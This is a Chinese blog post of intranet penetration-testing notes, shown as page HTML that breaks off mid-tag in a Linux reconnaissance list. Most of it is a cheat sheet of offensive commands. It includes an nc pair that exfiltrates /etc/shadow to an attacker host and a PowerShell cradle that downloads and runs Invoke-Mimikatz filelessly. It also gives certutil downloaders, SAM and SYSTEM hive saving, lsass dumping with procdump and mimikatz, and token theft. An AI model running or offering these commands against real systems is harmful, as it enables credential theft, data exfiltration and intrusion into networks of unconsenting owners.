<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#fff">












<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">



















  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/fish-32x32.png?v=6.4.1">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/fish-16x16.png?v=6.4.1">


  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#fff">



  <meta name="msapplication-config" content="/images/browserconfig.xml">







<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '6.4.1',
    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="内网渗透-笔记内网概念●内部工作人员才能访问的专用网络 ●能够获得的信息和服务是公众无法从互联网获取的 ●常见用局域网(LAN)和广域网(WAN)来建立内网 进行内网渗透的情况●突破外网进入内网 ●仅面向内网系统系统的渗透测试 ●模拟内部员工进行渗透测试 内网渗透基本流程 信息收集  获取权限  横向移动  权限维持  清理痕迹   域渗透流程 普通域内用户密码 登录到目标域中 域管进程 抓取域管">
<meta name="keywords" content="知识点">
<meta property="og:type" content="article">
<meta property="og:title" content="内网渗透-笔记">
<meta property="og:url" content="https://yingyingguaier.github.io/2018/12/24/内网渗透-笔记/index.html">
<meta property="og:site_name" content="0menc&#39;s Blog">
<meta property="og:description" content="内网渗透-笔记内网概念●内部工作人员才能访问的专用网络 ●能够获得的信息和服务是公众无法从互联网获取的 ●常见用局域网(LAN)和广域网(WAN)来建立内网 进行内网渗透的情况●突破外网进入内网 ●仅面向内网系统系统的渗透测试 ●模拟内部员工进行渗透测试 内网渗透基本流程 信息收集  获取权限  横向移动  权限维持  清理痕迹   域渗透流程 普通域内用户密码 登录到目标域中 域管进程 抓取域管">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-06-19T17:23:13.403Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="内网渗透-笔记">
<meta name="twitter:description" content="内网渗透-笔记内网概念●内部工作人员才能访问的专用网络 ●能够获得的信息和服务是公众无法从互联网获取的 ●常见用局域网(LAN)和广域网(WAN)来建立内网 进行内网渗透的情况●突破外网进入内网 ●仅面向内网系统系统的渗透测试 ●模拟内部员工进行渗透测试 内网渗透基本流程 信息收集  获取权限  横向移动  权限维持  清理痕迹   域渗透流程 普通域内用户密码 登录到目标域中 域管进程 抓取域管">






  <link rel="canonical" href="https://yingyingguaier.github.io/2018/12/24/内网渗透-笔记/">



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>内网渗透-笔记 | 0menc's Blog</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>
<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-right page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">0menc's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <p class="site-subtitle">学习、踩坑及经验分享</p>
      
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-commonweal">
    <a href="/404.html" rel="section">
      <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>Commonweal 404</a>
  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://yingyingguaier.github.io/2018/12/24/内网渗透-笔记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="嘤嘤怪er">
      <meta itemprop="description" content="0menc">
      <meta itemprop="image" content="/images/jack.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0menc's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">内网渗透-笔记
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-12-24 09:03:55" itemprop="dateCreated datePublished" datetime="2018-12-24T09:03:55+08:00">2018-12-24</time>
            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/整理/" itemprop="url" rel="index"><span itemprop="name">整理</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="内网渗透-笔记"><a href="#内网渗透-笔记" class="headerlink" title="内网渗透-笔记"></a>内网渗透-笔记</h1><h2 id="内网概念"><a href="#内网概念" class="headerlink" title="内网概念"></a>内网概念</h2><p>●内部工作人员才能访问的专用网络</p>
<p>●能够获得的信息和服务是公众无法从互联网获取的</p>
<p>●常见用局域网(LAN)和广域网(WAN)来建立内网</p>
<h2 id="进行内网渗透的情况"><a href="#进行内网渗透的情况" class="headerlink" title="进行内网渗透的情况"></a>进行内网渗透的情况</h2><p>●突破外网进入内网</p>
<p>●仅面向内网系统系统的渗透测试</p>
<p>●模拟内部员工进行渗透测试</p>
<h2 id="内网渗透基本流程"><a href="#内网渗透基本流程" class="headerlink" title="内网渗透基本流程"></a>内网渗透基本流程</h2><ol>
<li><p>信息收集</p>
</li>
<li><p>获取权限</p>
</li>
<li><p>横向移动</p>
</li>
<li><p>权限维持</p>
</li>
<li><p>清理痕迹</p>
</li>
</ol>
<h2 id="域渗透流程"><a href="#域渗透流程" class="headerlink" title="域渗透流程"></a>域渗透流程</h2><ol>
<li>普通域内用户密码</li>
<li>登录到目标域中</li>
<li>域管进程</li>
<li>抓取域管密码</li>
<li>定位域控</li>
<li>登录域控导出域内所有hash留存备份</li>
<li>域控制维持</li>
<li>后渗透</li>
</ol>
<h2 id="文件传输方法"><a href="#文件传输方法" class="headerlink" title="文件传输方法"></a>文件传输方法</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp -s:<span class="number">1</span><span class="selector-class">.txt</span>                        <span class="comment">//以1.txt中的内容执行ftp命令</span></span><br></pre></td></tr></table></figure>

<h4 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 下载文件程序 &gt;&gt; loader.vbs</span><br><span class="line">cscript loader<span class="selector-class">.vbs</span> 远程文件位置 保存文件位置</span><br></pre></td></tr></table></figure>

<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c (new-<span class="selector-tag">object</span> System<span class="selector-class">.Net</span><span class="selector-class">.WebClient</span>).DownloadFile(<span class="string">'远程文件位置'</span>,<span class="string">'保存文件位置'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil.<span class="keyword">exe</span> -urlcache -<span class="keyword">split</span> -<span class="keyword">f</span> 远程文件位置</span><br><span class="line">certutil.<span class="keyword">exe</span> -urlcache -<span class="keyword">split</span> -<span class="keyword">f</span> 远程文件位置 <span class="keyword">delete</span> 删除缓存</span><br></pre></td></tr></table></figure>

<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="wget和wput"><a href="#wget和wput" class="headerlink" title="wget和wput"></a>wget和wput</h4><h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击端监听端口，并重定向：</span><br><span class="line">nc -nvv -lp <span class="number">4455</span> &gt; shaodw.txt</span><br><span class="line">目标机将文件内容回传：</span><br><span class="line">nc <span class="number">192.168</span><span class="number">.111</span><span class="number">.251</span> <span class="number">4455</span> &lt; /etc/shadow</span><br></pre></td></tr></table></figure>

<h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://<span class="number">192.168</span><span class="meta">.111</span><span class="meta">.1</span>:<span class="number">8080</span>/<span class="keyword">test</span>/putty.exe</span><br></pre></td></tr></table></figure>

<h4 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h4><h4 id="Rsync"><a href="#Rsync" class="headerlink" title="Rsync"></a>Rsync</h4><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="python快速搭建服务器"><a href="#python快速搭建服务器" class="headerlink" title="python快速搭建服务器"></a>python快速搭建服务器</h4><table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">命令</th>
</tr>
</thead>
<tbody><tr>
<td align="center">http</td>
<td align="center">python -m SimpleHTTPServer 80</td>
</tr>
<tr>
<td align="center">ftp</td>
<td align="center">python -m pyftpdlib -p 21 (需要安装,默认用户anonymous)</td>
</tr>
</tbody></table>
<h4 id="防火墙对ftp两种模式的影响-尤其是Windows自带的ftp"><a href="#防火墙对ftp两种模式的影响-尤其是Windows自带的ftp" class="headerlink" title="防火墙对ftp两种模式的影响(尤其是Windows自带的ftp)"></a>防火墙对ftp两种模式的影响(尤其是Windows自带的ftp)</h4><h4 id="powershell搭建http"><a href="#powershell搭建http" class="headerlink" title="powershell搭建http"></a>powershell搭建http</h4><p><a href="https://gallery.technet.microsoft.com/scriptcenter/Powershell-Webserver-74dcf466/file/162511/2/Start-WebServer.ps1" target="_blank" rel="noopener">https://gallery.technet.microsoft.com/scriptcenter/Powershell-Webserver-74dcf466/file/162511/2/Start-WebServer.ps1</a></p>
<h2 id="Windows信息收集"><a href="#Windows信息收集" class="headerlink" title="Windows信息收集"></a>Windows信息收集</h2><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line"><span class="comment">#csv格式</span></span><br><span class="line">systeminfo /fo:csv</span><br></pre></td></tr></table></figure>

<h3 id="用户及用户组信息"><a href="#用户及用户组信息" class="headerlink" title="用户及用户组信息"></a>用户及用户组信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看当前用户及sid</span></span><br><span class="line">whoami /user</span><br><span class="line"><span class="comment">#查看用户组</span></span><br><span class="line">whoami /proups</span><br><span class="line"><span class="comment">#查看用户权限</span></span><br><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看用户</span></span><br><span class="line">net user</span><br><span class="line"><span class="comment">#查看admin用户详细信息</span></span><br><span class="line">net user <span class="string">"admin"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看组</span></span><br><span class="line">net localgroup</span><br><span class="line"><span class="comment">#查看administrators组</span></span><br><span class="line">net localgroup <span class="string">"administrators"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看密码策略</span></span><br><span class="line">net accounts</span><br></pre></td></tr></table></figure>

<h3 id="登录信息"><a href="#登录信息" class="headerlink" title="登录信息"></a>登录信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br><span class="line"><span class="comment">#查看在线用户，登陆时间，登录类型</span></span><br></pre></td></tr></table></figure>

<h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br><span class="line">ipconfig /all</span><br><span class="line">ipconfig /displaydns</span><br><span class="line"></span><br><span class="line">route</span><br><span class="line"><span class="comment">#查看路由信息</span></span><br><span class="line">route print -<span class="number">4</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#显示arp缓存</span></span><br><span class="line">arp -a</span><br><span class="line"></span><br><span class="line">netstat</span><br><span class="line"><span class="comment">#显示活动的tcp,udp及对应pid</span></span><br><span class="line">netstat -ano</span><br><span class="line"><span class="comment">#显示tcp连接</span></span><br><span class="line">netstat -p tcp</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看共享信息</span></span><br><span class="line">net share </span><br><span class="line"><span class="comment">#查看c$共享信息</span></span><br><span class="line">net share c$</span><br><span class="line"></span><br><span class="line"><span class="comment">#检索网络连接列表</span></span><br><span class="line">net use</span><br></pre></td></tr></table></figure>

<h3 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.cmdkey /list</span><br><span class="line"><span class="number">2</span>.Hosts文件 （C:\Windows\System32\drivers\etc\hosts）</span><br><span class="line"><span class="number">3</span>.回收站(cmd)</span><br><span class="line">cd C:\<span class="variable">$RECYCLE</span>.BIN</span><br><span class="line"><span class="comment">#dir /ah （查看文件夹，包括隐藏文件）</span></span><br></pre></td></tr></table></figure>

<h3 id="IIS信息收集"><a href="#IIS信息收集" class="headerlink" title="IIS信息收集"></a>IIS信息收集</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">IIS6 - adminscripts</span><br><span class="line">IIS7之后 - appcmd</span><br><span class="line">路径：%systemroot%\system32\inetsrv</span><br><span class="line"></span><br><span class="line"><span class="comment">#有权限条件下可执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#列出网站列表</span></span><br><span class="line">%systemroot%/system32/inetsrv/appcmd.exe list site</span><br><span class="line"><span class="comment">#列出物理路径</span></span><br><span class="line">%systemroot%/system32/inetsrv/appcmd.exe list vdir</span><br></pre></td></tr></table></figure>

<h3 id="凭证收集"><a href="#凭证收集" class="headerlink" title="凭证收集"></a>凭证收集</h3><p>思路：Windows hash、浏览器密码、cookie、远程桌面密码、VPN密码、WLAN密码、IIS服务器密码、FTP服务器密码等。</p>
<h4 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h4><p>NTLM hash 和 LM Hash</p>
<p>hash在内存中可被抓取</p>
<h4 id="离线凭证收集"><a href="#离线凭证收集" class="headerlink" title="离线凭证收集"></a>离线凭证收集</h4><h5 id="reg命令保存注册表键"><a href="#reg命令保存注册表键" class="headerlink" title="reg命令保存注册表键"></a>reg命令保存注册表键</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注意UAC</span></span><br><span class="line">reg save hklm\sam c:\sam.hive</span><br><span class="line">reg save hklm\system c:\system.hive</span><br></pre></td></tr></table></figure>

<h5 id="使用Invoke-NinjaCopy"><a href="#使用Invoke-NinjaCopy" class="headerlink" title="使用Invoke-NinjaCopy"></a>使用Invoke-NinjaCopy</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass</span><br><span class="line"><span class="built_in">Import-Module</span> .\invoke-ninjacopy.ps1</span><br><span class="line"><span class="comment"># -Path SAM/SYSTEM了路径  -LocalDestination 保存位置</span></span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination c：\sam.hive </span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM -LocalDestination c：\system.hive</span><br></pre></td></tr></table></figure>

<p>利用上述手段将两个文件保存到本地，再用saminside或cain导入</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#### Saminside</span></span><br><span class="line"></span><br><span class="line">exe程序，需要拿到sam和system文件</span><br><span class="line"></span><br><span class="line"><span class="comment">#### Cain</span></span><br><span class="line"></span><br><span class="line">类似Saminside。</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="离线提取lsass进程"><a href="#离线提取lsass进程" class="headerlink" title="离线提取lsass进程"></a>离线提取lsass进程</h5><p>任务管理器找到lsass进程后右键转储文件。（不同版本Windows进程名可能不同）</p>
<h5 id="procdump-exe"><a href="#procdump-exe" class="headerlink" title="procdump.exe"></a>procdump.exe</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cmd下</span></span><br><span class="line">procdump.exe -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<p>再用mimikatz提取密码(管理员)  （有Powershell版Mimikatz）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp </span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<h4 id="在线凭证收集"><a href="#在线凭证收集" class="headerlink" title="在线凭证收集"></a>在线凭证收集</h4><h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h5><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p>
<h5 id="Powershell版Mimikatz"><a href="#Powershell版Mimikatz" class="headerlink" title="Powershell版Mimikatz"></a>Powershell版Mimikatz</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Powershell版</span></span><br><span class="line"><span class="comment">#写好的Powershell文件</span></span><br><span class="line">powershell <span class="built_in">Import-Module</span> .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command <span class="string">'"privilege::debug" "sekurlsa::logonPasswords full"'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#无文件执行</span></span><br><span class="line">powershell Iex (<span class="built_in">new-object</span> net.webclient).downloadstring(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1’);Invoke-Mimikatz -Command <span class="string">'"privilege::debug" "sekurlsa::logonPasswords full"'</span></span><br></pre></td></tr></table></figure>

<h3 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h3><p>系统使用令牌来控制用户可访问的对象，并控制用户执行相关系统操作。</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#两种<span class="keyword">token</span></span><br><span class="line">·Delegation <span class="keyword">token</span>（授权令牌]：用于交互会话登录（例如本地用户直接登录、远程</span><br><span class="line">桌面登录）</span><br><span class="line">·Impersonation <span class="keyword">token</span>（模拟令牌]：用于非交互登录（利用<span class="keyword">net</span> <span class="keyword">use</span>访问共享文件夹）</span><br></pre></td></tr></table></figure>

<p>注：</p>
<p>两种token只在系统重启后清除</p>
<p>具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效</p>
<h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#管理员运行mimikatz</span></span><br><span class="line"><span class="comment">#获取debug权限</span></span><br><span class="line">privilege::debug</span><br><span class="line"><span class="comment">#模仿system用户的令牌</span></span><br><span class="line">token::elevate</span><br><span class="line"><span class="comment">#列出令牌</span></span><br><span class="line">token::list</span><br><span class="line"><span class="comment">#获取sam数据库中的密码</span></span><br><span class="line">lsadump::sam</span><br><span class="line"><span class="comment">#恢复令牌</span></span><br><span class="line">token::revert</span><br></pre></td></tr></table></figure>

<h5 id="Invoke-TokenManipulation-ps1"><a href="#Invoke-TokenManipulation-ps1" class="headerlink" title="Invoke-TokenManipulation.ps1"></a>Invoke-TokenManipulation.ps1</h5><p> <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p>
<h5 id="meterpreter中incognito"><a href="#meterpreter中incognito" class="headerlink" title="meterpreter中incognito"></a>meterpreter中incognito</h5><h2 id="Linux下信息收集"><a href="#Linux下信息收集" class="headerlink" title="Linux下信息收集"></a>Linux下信息收集</h2><h3 id="查看系统类型"><a href="#查看系统类型" class="headerlink" title="查看系统类型"></a>查看系统类型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /etc/lsb-release</span><br><span class="line">cat /etc/redhat-release (红帽子)</span><br></pre></td></tr></table></figure>

<h3 id="内核版本"><a href="#内核版本" class="headerlink" title="内核版本"></a>内核版本</h3><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /<span class="keyword">proc</span>/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q<span class="title"> kernel</span></span><br><span class="line"><span class="title">dmesg</span> |<span class="title"> grep</span> linux</span><br><span class="line">ls /boot |<span class="title"> grep</span> vmlinux</span><br></pre></td></tr></table></figure>

<h3 id="进程与服务"><a href="#进程与服务" class="headerlink" title="进程与服务"></a>进程与服务</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> aux</span><br><span class="line"><span class="keyword">ps</span> -ef</span><br><span class="line">top</span><br><span class="line"><span class="keyword">cat</span> /etc/services</span><br></pre></td></tr></table></figure>

<h3 id="安装的应用程序"><a href="#安装的应用程序" class="headerlink" title="安装的应用程序"></a>安装的应用程序</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dpkg -l</span></span><br><span class="line"><span class="attribute">rpm -qa</span></span><br></pre></td></tr></table></figure>

<h3 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cat</span> /etc/syslog.<span class="keyword">conf</span> </span><br><span class="line"><span class="keyword">cat</span> /etc/chttp.<span class="keyword">conf</span> </span><br><span class="line"><span class="keyword">cat</span> /etc/lighttpd.<span class="keyword">conf</span> </span><br><span class="line"><span class="keyword">cat</span> /etc/cups/cupsd.<span class="keyword">conf</span> </span><br><span class="line"><span class="keyword">cat</span> /etc/inetd.<span class="keyword">conf</span> </span><br><span class="line"><span class="keyword">cat</span> /etc/apache2/apache2.<span class="keyword">conf</span> </span><br><span class="line"><span class="keyword">cat</span> /etc/my.<span class="keyword">conf</span> </span><br><span class="line"><span class="keyword">cat</span> /etc/httpd/<span class="keyword">conf</span>/httpd.<span class="keyword">conf</span> </span><br><span class="line"><span class="keyword">cat</span> /<span 